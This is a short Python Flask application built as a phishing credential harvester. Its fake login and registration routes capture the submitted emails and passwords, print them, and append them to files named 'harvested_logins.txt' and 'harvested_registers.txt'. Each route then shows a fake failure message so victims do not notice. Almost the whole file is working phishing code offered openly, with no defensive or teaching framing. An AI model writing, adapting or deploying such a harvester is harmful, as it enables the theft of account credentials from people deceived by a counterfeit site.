from flask import Flask, request, render_template
import os

app = Flask(__name__)

# Fake login handler
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        print(f"[LOGIN] {email}:{password}")
        with open('harvested_logins.txt', 'a') as f:
            f.write(f"{email}:{password}\n")
        return "<h3>Login failed. Please try again later.</h3>"
    return render_template('login.html')

# Fake register handler
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        print(f"[REGISTER] {email}:{password}")
        with open('harvested_registers.txt', 'a') as f:
            f.write(f"{email}:{password}\n")
        return "<h3>Registration failed. Please try again later.</h3>"
    return render_template('register.html')

# Optional: home page
@app.route('/')
def home():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(port=5001, debug=True)

